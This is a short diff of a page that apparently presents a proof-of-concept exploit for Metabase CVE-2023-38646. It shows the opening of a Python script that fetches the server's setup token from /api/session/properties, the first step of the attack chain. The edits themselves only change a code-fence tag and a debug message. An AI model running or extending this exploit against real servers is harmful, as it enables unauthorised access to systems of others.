@@ -86,7 +86,7 @@ Metabase has a vulnerability (CVE-2023-38646)
     <p><br /><br />
 Use this POC
 <br /><br />
-```bash
+```python
 import requests
 import argparse
 import base64
@@ -102,7 +102,7 @@ from urllib.parse import urlparse</p>
     endpoint = “/api/session/properties”
     url = f”{ip_address}{endpoint}”
     try:
-        print(f”[DEBUG] Fetching setup token from {url}…”)
+        print(f”[DEBUG] Fetching setup token from {url}”)
         response = requests.get(url, verify=False)
         if response.status_code == 200:
             data = response.json()
